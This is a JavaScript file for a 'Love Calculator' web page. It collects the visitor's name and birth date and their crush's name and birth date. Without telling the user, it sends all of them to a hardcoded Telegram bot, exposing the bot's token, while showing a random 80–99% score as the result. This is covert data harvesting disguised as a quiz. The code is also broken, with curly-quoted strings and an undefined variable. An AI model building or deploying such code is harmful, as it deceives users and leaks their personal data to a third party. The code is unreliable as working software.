// 🔴 PASTE YOUR TELEGRAM DETAILS HERE
const BOT_TOKEN = "8178652110:AAEI8Q7XIDwXT2kUV7lMxPWAYqQ08P4nZC0"; // ✅ Token add kar diya hai
const CHAT_ID =”8413629225”; // ⚠️ Yahan apna Chat ID number likhna hai

function sendToTelegram(yourName, yourDOB, crushName, crushDOB) {
  const message = `

👤 Name: ${yourName}
🎂 DOB: ${yourDOB}

❤️ Crush: ${crushName}
🎂 Crush DOB: ${crushDOB}

🌐 Source: Love Calculator
  `;

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message
    })
  });
}

function calculateLove() {
  const yourName = document.getElementById("yourName").value.trim();
  const yourDOB = document.getElementById("yourDOB").value;
  const crushName = document.getElementById("crushName").value.trim();
  const crushDOB = document.getElementById("crushDOB").value;

  if (!yourName || !crushName || !yourDOB || !crushDOB) {
    alert("Please enter Names and Date of Birth ❤️");
    return;
  }

  // 🔥 SEND DATA TO TELEGRAM
  sendToTelegram(yourName, yourDOB, crushName, crushDOB);

  const Percent = Math.floor(Math.random() * 20) + 80;

  localStorage.setItem("yourName", yourName);
  localStorage.setItem("crushName", crushName);
  localStorage.setItem("lovePercent", lovePercent);

  window.location.href = "love.html";
}

 
